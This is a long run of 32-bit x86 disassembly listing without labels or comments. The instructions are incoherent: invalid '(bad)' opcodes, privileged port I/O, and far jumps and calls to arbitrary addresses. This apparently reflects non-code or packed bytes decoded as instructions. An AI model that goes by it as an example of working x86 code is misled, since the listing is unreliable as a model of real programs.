  4181cb:	xlat   BYTE PTR ds:[ebx]
  4181cc:	iret   
  4181cd:	sti    
  4181ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181cf:	push   edi
  4181d0:	in     eax,dx
  4181d1:	fwait
  4181d2:	pop    ebx
  4181d3:	fiadd  WORD PTR [eax-0x1f]
  4181d6:	ins    BYTE PTR es:[edi],dx
  4181d7:	imul   ecx,DWORD PTR [eax-0x27aa7dea],0x389ce6fc
  4181e1:	gs cmp al,0x59
  4181e4:	cli    
  4181e5:	pop    ds
  4181e6:	xchg   esi,eax
  4181e7:	pop    es
  4181e8:	test   DWORD PTR [ecx-0x3c98771e],edx
  4181ee:	jae    0x41819a
  4181f0:	mov    al,0x58
  4181f2:	sbb    eax,eax
  4181f4:	push   cs
  4181f5:	add    ah,BYTE PTR [esi+0x5434bbc4]
  4181fb:	not    ebx
  4181fd:	dec    esi
  4181fe:	cmc    
  4181ff:	fwait
  418200:	lahf   
  418201:	add    eax,0x349b533
  418206:	mov    dl,ah
  418208:	repnz test DWORD PTR [ebp+0x434e5344],ebp
  41820f:	xchg   ecx,ebp
  418211:	icebp  
  418212:	xchg   ebp,eax
  418213:	dec    esi
  418214:	pop    esi
  418215:	add    dh,BYTE PTR [eax]
  418217:	cmp    al,0x13
  418219:	imul   esp,DWORD PTR es:[edx],0xb42695a7
  418220:	cs test DWORD PTR fs:[ecx+eax*2+0x14],edi
  418226:	enter  0xf42f,0x1f
  41822a:	or     BYTE PTR [eiz*1+0x2ee5ee86],0xe0
  418232:	cmp    BYTE PTR [ecx],al
  418234:	sub    edx,DWORD PTR [ebp-0x30]
  418237:	cs xchg ebx,eax
  418239:	add    esp,DWORD PTR [ecx-0x6d]
  41823c:	sbb    eax,0xb8b798d4
  418241:	pop    es
  418242:	adc    al,0x4f
  418244:	scas   eax,DWORD PTR es:[edi]
  418245:	in     al,dx
  418246:	jmp    0x87612f0
  41824b:	mov    al,ds:0xaa30fd08
  418250:	scas   eax,DWORD PTR es:[edi]
  418251:	xor    esp,esp
  418253:	fwait
  418254:	outs   dx,BYTE PTR ds:[esi]
  418255:	ficom  DWORD PTR [ebx-0x31d93e77]
  41825b:	pop    esi
  41825c:	push   0x4d
  41825e:	out    dx,al
  41825f:	mov    cl,0x2
  418261:	dec    esp
  418262:	jo     0x41824c
  418264:	enter  0x3c8d,0xb
  418268:	cli    
  418269:	mov    eax,ds:0xbc7d7e54
  41826e:	sbb    al,0x57
  418270:	jb     0x418235
  418272:	add    al,0x7b
  418274:	dec    eax
  418275:	loope  0x4181fe
  418277:	dec    edi
  418278:	into   
  418279:	imul   esi,eax,0x9d8c32e0
  41827f:	dec    edi
  418280:	ror    DWORD PTR [esi+0x79fd72a7],1
  418286:	xchg   BYTE PTR [edx],cl
  418288:	add    al,bl
  41828a:	mov    bh,0x92
  41828c:	jp     0x41827c
  41828e:	mov    dh,0xf8
  418290:	gs mov bl,0xeb
  418293:	ins    BYTE PTR es:[edi],dx
  418294:	jb     0x418268
  418296:	(bad)  
  418297:	mov    eax,0x3efb58fc
  41829c:	fistp  WORD PTR [ebx+0x4c649b57]
  4182a2:	lea    esi,[edi+0x208aed05]
  4182a8:	(bad)  
  4182a9:	out    0x44,al
  4182ab:	mov    WORD PTR [edx-0x4f46b328],?
  4182b1:	pushf  
  4182b2:	shl    DWORD PTR [ebx-0x48e42b97],cl
  4182b8:	shl    bh,0x83
  4182bb:	or     al,0xd3
  4182bd:	push   cs
  4182be:	jbe    0x41831f
  4182c0:	in     al,0x3b
  4182c2:	push   cs
  4182c3:	rol    BYTE PTR [ebp-0x41c4101e],1
  4182c9:	popf   
  4182ca:	ss shl bl,0xad
  4182ce:	adc    ch,BYTE PTR [edx-0x186d85f3]
  4182d4:	jbe    0x418346
  4182d6:	jecxz  0x4182fe
  4182d8:	push   eax
  4182d9:	or     eax,0x8521f731
  4182de:	jns    0x418327
  4182e0:	out    0x2c,al
  4182e2:	daa    
  4182e3:	mov    eax,0xb72d2c93
  4182e8:	jecxz  0x4182d2
  4182ea:	mov    edi,0xfd45fd0f
  4182ef:	mov    ecx,?
  4182f1:	sbb    ecx,DWORD PTR fs:[esi+0x15e64a6b]
  4182f8:	shl    DWORD PTR [esi-0x7c],0x21
  4182fc:	mov    ebx,0x9b71ad39
  418301:	inc    ebx
  418302:	call   0x2db3:0x7c3f3841
  418309:	mov    bh,0x35
  41830b:	sbb    ebx,ebx
  41830d:	out    0x28,eax
  41830f:	xchg   esp,eax
  418310:	jno    0x4182e6
  418312:	sub    DWORD PTR [ecx],eax
  418314:	loopne 0x4182ef
  418316:	test   BYTE PTR [edi-0x38dd2ec6],dl
  41831c:	mov    ecx,0xf8c2910e
  418321:	aas    
  418322:	retf   
  418323:	dec    edx
  418324:	fsub   QWORD PTR ss:[edi-0x37eb0eb0]
  41832b:	sbb    al,0x4a
  41832d:	ds popa 
  41832f:	mov    bl,0x8
  418331:	or     bh,ah
  418333:	or     al,0x2
  418335:	mov    ds:0xa7c5b24c,eax
  41833a:	xlat   BYTE PTR ds:[ebx]
  41833b:	mov    ecx,0xc714dd8a
  418340:	pop    ds
  418341:	dec    esp
  418342:	ds pusha 
  418344:	add    esp,DWORD PTR [edi+0x71dcea2]
  41834a:	xchg   ebp,eax
  41834b:	scas   al,BYTE PTR es:[edi]
  41834c:	mov    edi,DWORD PTR [ebx-0x1d1fbada]
  418352:	push   0x3c
  418354:	and    al,BYTE PTR [ebp+0x53]
  418357:	inc    ebp
  418358:	add    DWORD PTR ds:0xf20ae780,0x630b5968
  418362:	lahf   
  418363:	mov    edi,DWORD PTR [edx+0x5d456026]
  418369:	xor    eax,0xbf5132a2
  41836e:	push   edi
  41836f:	inc    ebp
  418370:	dec    ebp
  418371:	neg    BYTE PTR [edx+edi*4-0x4]
  418375:	push   ss
  418376:	or     ch,BYTE PTR [eax]
  418378:	outs   dx,DWORD PTR ds:[esi]
  418379:	and    eax,0x9b6017f8
  41837e:	sub    eax,0x1cb375d6
  418383:	dec    esi
  418384:	sbb    eax,0xdbcb4907
  418389:	addr16 loopne 0x4183d5
  41838c:	(bad)  
  41838d:	sbb    ah,BYTE PTR [edi-0x39066266]
  418393:	stos   DWORD PTR es:[edi],eax
  418394:	mov    ds:0x48139425,eax
  418399:	daa    
  41839a:	dec    edx
  41839b:	in     al,0x7d
  41839d:	jns    0x418390
  41839f:	int3   
  4183a0:	sub    al,BYTE PTR [ecx+0x489cda40]
  4183a6:	dec    edi
  4183a7:	sub    BYTE PTR [edi+0x60d4a491],cl
  4183ad:	pop    ds
  4183ae:	in     eax,0xa9
  4183b0:	dec    ecx
  4183b1:	mov    ch,0x9f
  4183b3:	shr    BYTE PTR [ecx+0x63],0xac
  4183b7:	xor    BYTE PTR [ecx+esi*2],dl
  4183ba:	lods   eax,DWORD PTR ds:[esi]
  4183bb:	xor    dl,bh
  4183bd:	(bad)  
  4183bf:	into   
  4183c0:	cdq    
  4183c1:	xchg   DWORD PTR [edx-0x5ade553],esi
  4183c7:	mov    ebx,0x5bb8c87
  4183cc:	jg     0x4183d7
  4183ce:	add    eax,0xf0e5003e
  4183d3:	jmp    0x5a2b5eaa
  4183d8:	and    BYTE PTR [ecx],bh
  4183da:	es inc eax
  4183dc:	adc    esi,ebp
  4183de:	adc    DWORD PTR [ebp+0x3e],0x6
  4183e2:	or     DWORD PTR [ecx+eax*8],ebp
  4183e5:	mov    ch,0xa3
  4183e7:	out    0xc8,eax
  4183e9:	retf   
  4183ea:	add    eax,0xf63ff643
  4183ef:	xor    eax,0x2a63af34
  4183f4:	call   0x220b996e
  4183f9:	rcr    edx,cl
  4183fb:	(bad)  
  4183fc:	pop    edx
  4183fd:	xchg   esi,eax
  4183fe:	adc    ebp,DWORD PTR [esi]
  418400:	dec    ebx
  418401:	or     bl,BYTE PTR [ecx-0x5e037c7d]
  418407:	jae    0x4183eb
  418409:	dec    ecx
  41840a:	push   es
  41840b:	inc    ebp
  41840c:	xor    BYTE PTR [ebp+0x7154967],ah
  418412:	mov    al,ds:0x6e71921e
  418417:	outs   dx,DWORD PTR ds:[esi]
  418418:	out    dx,eax
  418419:	loope  0x418430
  41841b:	sbb    al,0x8d
  41841d:	repnz pusha 
  41841f:	mov    ah,0x9a
  418421:	inc    ebx
  418422:	sbb    ch,BYTE PTR [edi+0x38]
  418425:	lods   eax,DWORD PTR ds:[esi]
  418426:	jmp    0x47e080d0
  41842b:	pop    ebx
  41842c:	jae    0x418444
  41842e:	in     eax,dx
  41842f:	jbe    0x418499
  418431:	mov    esi,0x651b9a06
  418436:	push   edi
  418437:	retf   0x3a01
  41843a:	mov    edx,0xa4994670
  41843f:	xor    dh,ah
  418441:	mov    bl,al
  418443:	or     edi,DWORD PTR [ebx+ecx*1]
  418446:	scas   al,BYTE PTR es:[edi]
  418447:	std    
  418448:	xchg   ebx,ecx
  41844a:	mov    ah,0x41
  41844c:	enter  0x99ff,0xf6
  418450:	ja     0x418412
  418452:	sbb    dh,bh
  418454:	mov    dh,0xf5
  418456:	sbb    al,0x8a
  418458:	mov    edx,0x1b3314f4
  41845d:	pop    ss
  41845e:	sub    al,BYTE PTR [esi-0x135f10ec]
  418464:	fwait
  418465:	sbb    eax,0x1c8fd35d
  41846a:	add    DWORD PTR [esi-0x70bfcd3e],esi
  418470:	mov    eax,0xb143dad2
  418475:	jb     0x418450
  418477:	ja     0x418497
  418479:	and    al,0xf5
  41847b:	mov    dh,0x7f
  41847d:	data16 out 0x25,al
  418480:	sub    ebx,edx
  418482:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  418484:	or     dh,BYTE PTR [edx+0x75]
  418487:	popf   
  418488:	rcr    BYTE PTR [edx-0x73],0xcd
  41848c:	or     eax,0x109f2228
  418491:	in     al,0x10
  418493:	dec    esi
  418494:	xchg   edi,eax
  418495:	adc    dh,BYTE PTR [eax+0x6f48be3b]
  41849b:	imul   eax,ebx,0xffffffaf
  41849e:	clc    
  41849f:	sub    edi,ebx
  4184a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184a2:	(bad)  
  4184a3:	mov    BYTE PTR [edx+0x1],bl
  4184a6:	das    
  4184a7:	mov    bl,0xb0
  4184a9:	shr    DWORD PTR [eax],1
  4184ab:	imul   esi,esi,0xffffffa2
  4184ae:	outs   dx,BYTE PTR ds:[esi]
  4184af:	outs   dx,BYTE PTR ds:[esi]
  4184b0:	adc    al,0xa4
  4184b2:	popa   
  4184b3:	popa   
  4184b4:	inc    ecx
  4184b5:	(bad)  
  4184b6:	jo     0x41845f
  4184b8:	pusha  
  4184b9:	mov    esi,0xc6452c6f
  4184be:	sub    al,0x42
  4184c0:	out    0x65,eax
  4184c2:	jnp    0x41844d
  4184c4:	pop    ss
  4184c5:	mov    ebp,0x49b2cfc
  4184ca:	push   esi
  4184cb:	mov    bh,0xc
  4184cd:	mov    DWORD PTR [edi],ebp
  4184cf:	mov    eax,DWORD PTR [eax+eax*4-0x676c0ab9]
  4184d6:	inc    ebx
  4184d7:	push   ebp
  4184d8:	jp     0x41851d
  4184da:	or     eax,0xa49ef883
  4184df:	scas   eax,DWORD PTR es:[edi]
  4184e0:	inc    ecx
  4184e1:	add    BYTE PTR [ecx-0xd],ah
  4184e4:	or     BYTE PTR [ebx+ebx*2],0x37
  4184e8:	xadd   DWORD PTR [edx+0x633acc3c],esp
  4184ef:	mov    eax,0xc147b22b
  4184f4:	xor    BYTE PTR es:[ecx],al
  4184f7:	push   edi
  4184f8:	repnz pusha 
  4184fa:	sub    eax,0xa94fecfd
  4184ff:	push   ds
  418500:	adc    DWORD PTR [eax],eax
  418502:	call   0x2e1df344
  418507:	lock xor eax,0xff6cb03f
  41850d:	rol    DWORD PTR [ecx],cl
  41850f:	test   eax,edi
  418511:	repz test BYTE PTR [edx+ecx*1-0x3a],0xab
  418517:	sbb    ah,BYTE PTR [ebp+0x69]
  41851a:	push   0xdb876396
  41851f:	sti    
  418520:	outs   dx,DWORD PTR ds:[esi]
  418521:	push   ecx
  418522:	lock mov eax,0xd10204b4
  418528:	add    al,0x2c
  41852a:	jns    0x41851b
  41852c:	jmp    0x3777141b
  418531:	aaa    
  418532:	sti    
  418533:	pop    eax
  418534:	cli    
  418535:	jo     0x4184e6
  418537:	lds    ebx,FWORD PTR [esi-0x7ba6a963]
  41853d:	inc    eax
  41853e:	fsub   DWORD PTR [esi+ecx*4-0x8]
  418542:	mov    cl,BYTE PTR [eax]
  418544:	mov    ebx,0xb2afd197
  418549:	add    al,0x95
  41854b:	ret    0x2e64
  41854e:	mov    ebx,DWORD PTR [edi-0x2e75953a]
  418554:	xor    eax,0x274cbcc7
  418559:	mov    ecx,0x2e81d857
  41855e:	and    edx,DWORD PTR [edx]
  418560:	push   esi
  418561:	push   ss
  418562:	mov    bh,0x1a
  418564:	sub    ebx,DWORD PTR [edx-0x41b9befa]
  41856a:	pusha  
  41856b:	mov    BYTE PTR [ebp+0x7f6f1e21],ch
  418571:	mov    ah,0xd3
  418573:	fadd   QWORD PTR [ebp-0x5a]
  418576:	or     ecx,esi
  418578:	ins    DWORD PTR es:[edi],dx
  418579:	jns    0x418540
  41857b:	push   ss
  41857c:	aaa    
  41857d:	addr16 dec esi
  41857f:	mov    edx,0x4990620f
  418584:	pop    ecx
  418585:	retf   
  418586:	and    DWORD PTR [edx-0x17],esi
  418589:	cwde   
  41858a:	inc    eax
  41858b:	jo     0x41859d
  41858d:	mov    al,0x35
  41858f:	mov    ah,BYTE PTR [ebx]
  418591:	dec    edi
  418592:	int    0x60
  418594:	push   0xc1deff35
  418599:	ins    DWORD PTR es:[edi],dx
  41859a:	pusha  
  41859b:	out    0x45,al
  41859d:	xchg   esp,eax
  41859e:	ficom  DWORD PTR [eax+ebx*4-0x7a]
  4185a2:	inc    esp
  4185a3:	jl     0x4185e8
  4185a5:	scas   al,BYTE PTR es:[edi]
  4185a6:	xchg   BYTE PTR [edi],ch
  4185a8:	cdq    
  4185a9:	cld    
  4185aa:	stos   BYTE PTR es:[edi],al
  4185ab:	imul   DWORD PTR ds:0x3466419b
  4185b1:	jge    0x418607
  4185b3:	sahf   
  4185b4:	les    eax,FWORD PTR [ecx-0x2a]
  4185b7:	test   eax,0xef972ee2
  4185bc:	cmp    al,0xe8
  4185be:	pop    ds
  4185bf:	cmp    DWORD PTR [eax+0x64df94e2],edi
  4185c5:	push   cs
  4185c6:	push   es
  4185c7:	cs shl esp,cl
  4185ca:	cs and ecx,eax
  4185cd:	cmp    ebx,DWORD PTR [edx+0xa]
  4185d0:	daa    
  4185d1:	icebp  
  4185d2:	push   ebx
  4185d3:	mov    ecx,0xc0d28fd8
  4185d8:	or     esp,eax
  4185da:	mov    ds:0x2c4e697e,eax
  4185df:	dec    esi
  4185e0:	sbb    dh,bl
  4185e2:	outs   dx,BYTE PTR ds:[esi]
  4185e3:	into   
  4185e4:	and    ah,BYTE PTR [esi+0x2a0d5ec9]
  4185ea:	pop    ecx
  4185eb:	push   ebp
  4185ec:	or     al,0x89
  4185ee:	mov    ch,0x43
  4185f0:	mov    cl,0x38
  4185f2:	out    dx,al
  4185f3:	fldenv [edx+0x15]
  4185f6:	test   ch,0x16
  4185f9:	mov    al,ds:0x1f998b36
  4185fe:	jmp    0x99cd:0x2ae453e2
  418605:	or     ecx,DWORD PTR [ecx+0x77]
  418608:	jne    0x4185d7
  41860a:	sbb    DWORD PTR [eax],ebx
  41860c:	sbb    bh,BYTE PTR [edi-0x18]
  41860f:	dec    esp
  418610:	aas    
  418611:	cmp    DWORD PTR [esi+0x55],edi
  418614:	jbe    0x4185e7
  418616:	ror    DWORD PTR [edx+0x4593e5],0xef
  41861d:	aaa    
  41861e:	shr    DWORD PTR [ebx],cl
  418620:	jg     0x4185bd
  418622:	aaa    
  418623:	push   esp
  418624:	or     DWORD PTR [edi],0xa2834130
  41862a:	pop    ss
  41862b:	dec    eax
  41862c:	dec    ebx
  41862d:	and    al,0x39
  41862f:	jbe    0x41863c
  418631:	inc    ebx
  418632:	imul   ebp,DWORD PTR [edx-0x21def19f],0xafa2b081
  41863c:	fs out 0x50,al
  41863f:	sub    bl,dh
  418641:	rcl    DWORD PTR ds:0xf5403b9a,1
  418647:	inc    esp
  418648:	mov    ds:0x1218cd4,al
  41864d:	jl     0x41864f
  41864f:	pop    edi
  418650:	inc    ecx
  418651:	dec    ecx
  418652:	mov    edi,0xafaca8fb
  418657:	mov    ah,0xd7
  418659:	fbld   TBYTE PTR [eax-0x5c06e6cf]
  41865f:	sub    BYTE PTR [ebx],dl
  418661:	out    0x7f,eax
  418663:	xchg   esp,eax
  418664:	outs   dx,BYTE PTR ds:[esi]
  418665:	(bad)
  418668:	mov    cl,0x90
  41866a:	les    ecx,FWORD PTR [esi-0x2e]
  41866d:	dec    ecx
  41866e:	std    
  41866f:	xchg   BYTE PTR [edx+0x6290ae54],bl
  418675:	lea    esi,[ebp-0x2c742655]
  41867b:	aam    0xd5
  41867d:	outs   dx,BYTE PTR ds:[esi]
  41867e:	mov    ebx,0x122d2d24
  418683:	out    0xc4,eax
  418685:	fidivr DWORD PTR ds:0x5d98df95
  41868b:	jmp    0x6671:0x8fe04cbb
  418692:	push   0xffffff80
  418694:	inc    esi
  418695:	xchg   ecx,eax
  418696:	or     ch,BYTE PTR [ecx-0xc]
  418699:	fsubp  st(6),st
  41869b:	loop   0x4186ef
  41869d:	jnp    0x4186e3
  41869f:	push   0x32
  4186a1:	pushf  
  4186a2:	int3   
  4186a3:	cli    
  4186a4:	push   ebp
  4186a5:	add    al,0xeb
  4186a7:	aam    0xbc
  4186a9:	xchg   esp,eax
  4186aa:	sub    esp,ecx
  4186ac:	and    eax,0xe8be505d
  4186b1:	xchg   ebp,eax
  4186b2:	adc    al,0x99
  4186b4:	sbb    DWORD PTR [edi-0x1e],0xffffffbc
  4186b8:	push   0xffffffa6
  4186ba:	sub    BYTE PTR [ecx],bh
  4186bc:	mov    bh,0xdd
  4186be:	pop    edi
  4186bf:	shl    BYTE PTR [edx-0x2a],1
  4186c2:	cwde   
  4186c3:	aaa    
  4186c4:	or     eax,0x1cec850
  4186c9:	pop    ebx
  4186ca:	mov    esi,esp
  4186cc:	lds    eax,FWORD PTR [edi+eiz*8+0x62e846cf]
  4186d3:	cmp    ch,BYTE PTR [eax+0x74]
  4186d6:	test   ebx,ebp
  4186d8:	fcomp  DWORD PTR [ebx-0x4e]
  4186db:	sub    eax,0x7a7e69f9
  4186e0:	(bad)  
  4186e1:	or     ah,bl
  4186e3:	shl    BYTE PTR [esi+0x7e],cl
  4186e6:	inc    ecx
  4186e7:	mov    ah,0x76
  4186e9:	rol    BYTE PTR [edx+0x4d],cl
  4186ec:	xor    DWORD PTR [esi-0x3e],ecx
  4186ef:	mov    DWORD PTR [ebp-0x215d51ff],edi
  4186f5:	pop    es
  4186f6:	pop    edx
  4186f7:	lea    ebx,[ecx+0x416eaf75]
  4186fd:	jo     0x418712
  4186ff:	mov    ch,0xa4
  418701:	fstp   DWORD PTR [eax+ecx*4]
  418704:	les    edx,FWORD PTR [edx+0x152183f8]
  41870a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41870b:	inc    edx
  41870c:	add    eax,0xbc86ba3
  418711:	repnz (bad) 
  418713:	je     0x418713
  418715:	push   ebx
  418716:	mov    esi,0xc28a40
  41871b:	mov    ebp,0xddcb4381
  418720:	icebp  
  418721:	lds    esi,FWORD PTR [edx+0x3]
  418724:	cdq    
  418725:	sbb    DWORD PTR ds:0x1c900a58,ebx
  41872b:	pop    ss
  41872c:	sti    
  41872d:	add    al,0x2a
  41872f:	push   esp
  418730:	(bad)  
  418732:	adc    DWORD PTR [edx+eiz*8+0xb8d8743],edi
  418739:	nop
  41873a:	outs   dx,BYTE PTR ds:[esi]
  41873b:	nop
  41873c:	jmp    0x4186f1
  41873e:	stos   DWORD PTR es:[edi],eax
  41873f:	call   0x52:0xcb82519a
  418746:	push   edi
  418747:	nop
  418748:	addr16 or bh,al
  41874b:	imul   esp,DWORD PTR [esp+edx*1-0x1a],0xc3168fa2
  418753:	mov    dl,0xf0
  418755:	sub    edx,0xf
  418758:	into   
  418759:	mov    BYTE PTR [edi-0x59047038],bl
  41875f:	retf   0xf5b3
  418762:	outs   dx,BYTE PTR ds:[esi]
  418763:	xchg   DWORD PTR [edi],edx
  418765:	xor    ecx,DWORD PTR [edx]
  418767:	aas    
  418768:	xchg   ecx,eax
  418769:	dec    ebp
  41876a:	mov    esp,0xe267f57c
  41876f:	(bad)  
  418770:	push   ebp
  418771:	cld    
  418772:	pop    esi
  418773:	loop   0x418736
  418775:	popf   
  418776:	popa   
  418777:	xchg   ebp,eax
  418778:	out    dx,eax
  418779:	mov    edx,0x1da0da85
  41877e:	pop    DWORD PTR [eax]
  418780:	push   ebp
  418781:	out    0x4c,al
  418783:	inc    ebx
  418784:	sbb    DWORD PTR [esi+ebp*1-0x3d],0xfffffffb
  418789:	and    ah,BYTE PTR [edx]
  41878b:	sti    
  41878c:	call   0x434c:0x1bc0f7f7
  418793:	scas   eax,DWORD PTR es:[edi]
  418794:	inc    eax
  418795:	aaa    
  418796:	and    ebx,0xffffffbb
  418799:	(bad)  
  41879a:	cmp    ecx,DWORD PTR [edi+0x18]
  41879d:	call   0x6b2a60d8
  4187a2:	arpl   WORD PTR [eax-0x78],si
  4187a5:	into   
  4187a6:	inc    ebp
  4187a7:	xchg   esp,eax
  4187a8:	test   al,0x75
  4187aa:	push   edi
  4187ab:	jae    0x4187e0
  4187ad:	data16 mov ds:0x95e4468b,al
  4187b4:	loopne 0x418756
  4187b6:	jp     0x41878e
  4187b8:	pop    ds
  4187b9:	add    BYTE PTR fs:[ecx-0x7e],0xc2
  4187be:	daa    
  4187bf:	dec    ebp
  4187c0:	cmp    BYTE PTR [ebp-0x1292c87c],0x67
  4187c7:	xchg   esi,eax
  4187c8:	xor    BYTE PTR [ebp+0x7e],ah
  4187cb:	xor    ebp,0xffffff8b
  4187ce:	fmul   st,st(7)
  4187d0:	and    eax,0x4426dcb2
  4187d5:	push   es
  4187d6:	jno    0x418832
  4187d8:	xor    BYTE PTR [edi],0xa
  4187db:	mov    bl,ah
  4187dd:	dec    ecx
  4187de:	fldcw  WORD PTR [esi]
  4187e0:	sbb    BYTE PTR [edx+edx*4-0x7818136],dl
  4187e7:	push   cs
  4187e8:	cwde   
  4187e9:	rcr    ebx,cl
  4187eb:	mov    WORD PTR [ecx],?
  4187ed:	jae    0x4187a0
  4187ef:	mov    bh,0xe2
  4187f1:	and    esi,ebp
  4187f3:	inc    ebx
  4187f4:	ret    
  4187f5:	daa    
  4187f6:	daa    
  4187f7:	add    DWORD PTR [ebx],edi
  4187f9:	std    
  4187fa:	popa   
  4187fb:	arpl   WORD PTR [ebx+0x4e],di
  4187fe:	push   ecx
  4187ff:	ins    DWORD PTR es:[edi],dx
  418800:	xlat   BYTE PTR ds:[ebx]
  418801:	mov    esp,0xae1bef1
  418806:	push   0xe0e30eb1
  41880b:	pusha  
  41880c:	test   BYTE PTR [esp+ebx*8+0x34699d9d],ah
  418813:	test   BYTE PTR [ebx-0x19928358],cl
  418819:	pushf  
  41881a:	mov    esp,0x8c86ffad
  41881f:	(bad)  
  418820:	out    0xee,al
  418822:	into   
  418823:	hlt    
  418824:	gs out dx,eax
  418826:	sti    
  418827:	mov    dh,0xe8
  418829:	mov    bh,0x65
  41882b:	xchg   edi,eax
  41882c:	fsubr  QWORD PTR [edi]
  41882e:	sub    eax,0x6e1c0620
  418833:	les    esi,FWORD PTR ss:[esi+0x2b]
  418837:	in     eax,dx
  418838:	imul   esi,DWORD PTR [esi+0x5ec4a34f],0xffffffa2
  41883f:	mov    ebx,0x552d9053
  418844:	mov    eax,0xb5878145
  418849:	je     0x418805
  41884b:	imul   eax,DWORD PTR [ebp+edx*1+0x68],0xffffffa0
  418850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418851:	or     eax,0x4e3f2f02
  418856:	repz mov esp,0x3df0a6e3
  41885c:	pushf  
  41885d:	dec    edi
  41885e:	cwde   
  41885f:	xor    DWORD PTR [ebx+0x8],eax
  418862:	retf   
  418863:	adc    al,BYTE PTR ds:0x46870858
  418869:	aad    0x68
  41886b:	sbb    dh,bh
  41886d:	imul   eax,DWORD PTR [ebx-0x4f],0xffffffc8
  418871:	cli    
  418872:	(bad)  
  418873:	ret    
  418874:	cmp    al,0xd5
  418876:	test   DWORD PTR [esi],ebx
  418878:	adc    al,0x6c
  41887a:	jne    0x418817
  41887c:	arpl   si,ax
  41887e:	fcomp  DWORD PTR [ecx+esi*4-0x26]
  418882:	inc    edi
  418883:	imul   DWORD PTR [eax-0x3b]
  418886:	xchg   esi,eax
  418887:	mov    ch,0x67
  418889:	sbb    BYTE PTR [eax+0x33],cl
  41888c:	lock dec edi
  41888e:	fnstcw WORD PTR [ebx+0xa]
  418891:	pop    ebx
  418892:	cs pop ebx
  418894:	dec    edi
  418895:	aam    0xd5
  418897:	outs   dx,BYTE PTR ds:[esi]
  418898:	mov    bh,0xa6
  41889a:	cmp    eax,0xb780564e
  41889f:	popf   
  4188a0:	and    BYTE PTR [edx+0xd],dl
  4188a3:	addr16 add eax,eax
  4188a6:	ret    0xce1b
  4188a9:	retf   
  4188aa:	idiv   DWORD PTR [edi]
  4188ac:	in     al,0xd6
  4188ae:	data16 jp 0x4188d1
  4188b1:	icebp  
  4188b2:	imul   edx,DWORD PTR [esi-0x212ab2de],0x72
  4188b9:	out    0x77,eax
  4188bb:	jmp    0x66fa0792
  4188c0:	mov    dh,BYTE PTR [edx+0x3e]
  4188c3:	sub    DWORD PTR [eax+0x4cba8a46],0x3954e8a8
  4188cd:	iret   
  4188ce:	pop    ss
  4188cf:	cwde   
  4188d0:	cmc    
  4188d1:	push   es
  4188d2:	aas    
  4188d3:	sbb    BYTE PTR [edx+eiz*8],dl
  4188d6:	ret    0x9c46
  4188d9:	xchg   esp,eax
  4188da:	push   edx
  4188db:	mov    bh,0x7c
  4188dd:	sbb    eax,DWORD PTR [esi+0x55eb1b55]
  4188e3:	out    0x83,eax
  4188e5:	sbb    DWORD PTR [edi+0x488642b5],eax
  4188eb:	shl    DWORD PTR ds:0x107c33cc,0x12
  4188f2:	add    esp,0xffffffc6
  4188f5:	mov    dh,0xbe
  4188f7:	dec    eax
  4188f8:	arpl   si,bx
  4188fa:	adc    ebp,DWORD PTR [edx-0x113fc017]
  418900:	in     eax,0xeb
  418902:	mov    ecx,0xb581fe18
  418907:	pushaw 
  418909:	test   bl,cl
  41890b:	and    DWORD PTR [ebp+0x44e796cd],0x47
  418912:	mov    esi,0xd738aa20
  418917:	and    BYTE PTR [ecx-0x7c],dl
  41891a:	cdq    
  41891b:	xchg   dl,al
  41891d:	pushf  
  41891e:	adc    BYTE PTR [ecx],cl
  418920:	mov    edi,edi
  418922:	or     DWORD PTR [eax-0x16],0xffffffd0
  418926:	mov    cl,0xe4
  418928:	push   cs
  418929:	call   0x3b18:0xfb8315f3
  418930:	mov    dh,BYTE PTR [eax]
  418932:	lds    ebp,FWORD PTR [edi-0x9]
  418935:	mov    esi,0x72a1d691
  41893a:	ins    BYTE PTR es:[edi],dx
  41893b:	adc    ebp,DWORD PTR [esi+0x420f527a]
  418941:	dec    ecx
  418942:	iret   
  418943:	push   edx
  418944:	fcomp  QWORD PTR [ecx]
  418946:	push   ecx
  418947:	adc    BYTE PTR [ecx],cl
  418949:	cmp    al,0x14
  41894b:	sub    al,0xb7
  41894d:	icebp  
  41894e:	sbb    edi,ebx
  418950:	test   BYTE PTR [eax],0x86
  418953:	mov    al,ds:0x6972c95f
  418958:	or     al,cl
  41895a:	bound  ebx,QWORD PTR [esi]
  41895c:	aam    0x55
  41895e:	cmp    al,0x68
  418960:	and    BYTE PTR [ecx+0x7b],bl
  418963:	sub    dl,0xc0
  418966:	sbb    ebx,DWORD PTR [esi-0x4e249a63]
  41896c:	mov    edx,edi
  41896e:	and    edi,DWORD PTR [ecx]
  418970:	cmp    DWORD PTR [esi-0x19],edx
  418973:	mov    fs,ecx
  418975:	push   ecx
  418976:	xor    BYTE PTR [edx-0x9],dl
  418979:	sub    ecx,DWORD PTR ds:0xdce70bb7
  41897f:	xor    esp,DWORD PTR [esi*1+0x29fe181]
  418986:	add    BYTE PTR [esi+0x145b10e0],bh
  41898c:	pop    es
  41898d:	xchg   esi,eax
  41898e:	enter  0x49c,0xfb
  418992:	and    eax,0x8e50d011
  418997:	mov    bh,0x4
  418999:	das    
  41899a:	jl     0x41893c
  41899c:	icebp  
  41899d:	xchg   esi,eax
  41899e:	mov    ah,0xbb
  4189a0:	push   edx
  4189a1:	out    0x2d,eax
  4189a3:	or     DWORD PTR [edx+0x63859062],edx
  4189a9:	add    DWORD PTR [ecx],ebx
  4189ab:	fcom   DWORD PTR [ebx]
  4189ad:	pop    edx
  4189ae:	js     0x4189a6
  4189b0:	push   ecx
  4189b1:	ret    
  4189b2:	(bad)  
  4189b3:	scas   eax,DWORD PTR es:[edi]
  4189b4:	cmp    eax,DWORD PTR [edx]
  4189b6:	out    0x61,al
  4189b8:	(bad)  
  4189b9:	jnp    0x4189e8
  4189bb:	or     DWORD PTR ds:0xa55584d2,ebp
  4189c1:	push   edx
  4189c2:	sbb    ah,ch
  4189c4:	sub    BYTE PTR [edx+0x1b343fc0],dh
  4189ca:	and    al,0x1e
  4189cc:	mov    edx,0x4f5b49c5
  4189d1:	dec    edx
  4189d2:	dec    edx
  4189d3:	jmp    0xf2faadfb
  4189d8:	das    
  4189d9:	test   DWORD PTR [edx+0x72],0x6e356d79
  4189e0:	fwait
  4189e1:	in     al,0xd2
  4189e3:	mov    ss,WORD PTR [ecx-0x45]
